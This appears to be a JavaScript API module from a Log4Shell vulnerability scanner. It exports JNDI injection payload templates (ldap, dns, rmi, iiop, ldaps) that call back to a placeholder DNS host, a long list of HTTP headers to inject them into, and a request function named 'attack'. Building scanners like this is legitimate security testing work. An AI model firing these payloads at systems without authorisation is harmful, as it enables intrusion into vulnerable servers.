import request from '@/utils/request'

export function uploadPayloads(data) {
  return request({
    url: '/payloads',
    method: 'POST',
    data
    // params: query
  })
}

export function uploadHeaders(data) {
  return request({
    url: '/checkHeaders',
    method: 'POST',
    data
    // params: query
  })
}

export function header(data) {
  return request({
    url: '/headers',
    method: 'POST',
    data
  })
}

export function attack(data) {
  return request({
    url: '/check',
    method: 'POST',
    data
  })
}

const origPayloads = [
  '${jndi:ldap://{{dnsIP}}/}',
  '${jndi:dns://{{dnsIP}}/}',
  '${jndi:iiop://{{dnsIP}}/}',
  '${jndi:rmi://{{dnsIP}}/}',
  '${jndi:ldaps://{{dnsIP}}/}'
]

const payloads_detail = [
  {
    jndi_pre: '',
    jndi_suf: '',
    protocol: 'ldap',
    protocol_pre: '',
    protocol_suf: ''
  },
  {
    jndi_pre: '',
    jndi_suf: '',
    protocol: 'dns',
    protocol_pre: '',
    protocol_suf: ''
  },
  {
    jndi_pre: '',
    jndi_suf: '',
    protocol: 'iiop',
    protocol_pre: '',
    protocol_suf: ''
  },
  {
    jndi_pre: '',
    jndi_suf: '',
    protocol: 'rmi',
    protocol_pre: '',
    protocol_suf: ''
  },
  {
    jndi_pre: '',
    jndi_suf: '',
    protocol: 'ladps',
    protocol_pre: '',
    protocol_suf: ''
  }
]

const headers = [
  'Accept-Charset', 'Accept-Datetime', 'Accept-Encoding',
  'Accept-Language', 'Authorization', 'Cache-Control',
  'Cf-Connecting_ip', 'Client-Ip', 'Contact', 'Cookie',
  'DNT', 'Forwarded', 'Forwarded-For', 'Forwarded-For-Ip',
  'Forwarded-Proto', 'From', 'If-Modified-Since', 'Max-Forwards',
  'Origin', 'Originating-Ip', 'Pragma', 'Referer', 'TE',
  'True-Client-IP', 'True-Client-Ip', 'Upgrade', 'User-Agent',
  'Via', 'Warning', 'X-ATT-DeviceId', 'X-Api-Version', 'X-Att-Deviceid',
  'X-CSRFToken', 'X-Client-Ip', 'X-Correlation-ID',
  'X-Csrf-Token', 'X-Do-Not-Track', 'X-Foo', 'X-Foo-Bar',
  'X-Forward-For', 'X-Forward-Proto', 'X-Forwarded', 'X-Forwarded-By',
  'X-Forwarded-For', 'X-Forwarded-For-Original', 'X-Forwarded-Host',
  'X-Forwarded-Port', 'X-Forwarded-Proto', 'X-Forwarded-Protocol',
  'X-Forwarded-Scheme', 'X-Forwarded-Server', 'X-Forwarded-Ssl',
  'X-Forwarder-For', 'X-Frame-Options', 'X-From', 'X-Geoip-Country',
  'X-HTTP-Method-Override', 'X-Http-Destinationurl', 'X-Http-Host-Override',
  'X-Http-Method', 'X-Http-Method-Override', 'X-Http-Path-Override', 'X-Https',
  'X-Htx-Agent', 'X-Hub-Signature', 'X-If-Unmodified-Since', 'X-Imbo-Test-Config',
  'X-Insight', 'X-Ip', 'X-Ip-Trail', 'X-Leakix', 'X-Originating-Ip', 'X-ProxyUser-Ip',
  'X-Real-Ip', 'X-Remote-Addr', 'X-Remote-Ip', 'X-Request-ID', 'X-Requested-With',
  'X-UIDH', 'X-Wap-Profile', 'X-XSRF-TOKEN']

export { origPayloads, headers, payloads_detail }
